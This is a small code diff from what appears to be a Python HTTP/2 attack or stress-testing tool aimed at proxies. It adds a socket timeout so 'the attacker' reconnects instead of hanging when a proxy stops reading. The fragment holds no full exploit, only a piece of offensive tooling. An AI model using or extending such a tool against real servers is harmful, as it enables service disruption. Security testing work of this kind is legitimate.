@@ -146,6 +146,7 @@ async def nonreader(i, dl, host, port, path=b"/?s=1g"):
 
 def h2_conn(host, port, init_settings=()):
     s = socket.create_connection((host, port))
+    s.settimeout(5)  # a proxy that stops reading must not hang the attacker: the send fails and we reconnect
     s.sendall(PREFACE + settings(init_settings))
     COUNT["conns"] += 1
     return s
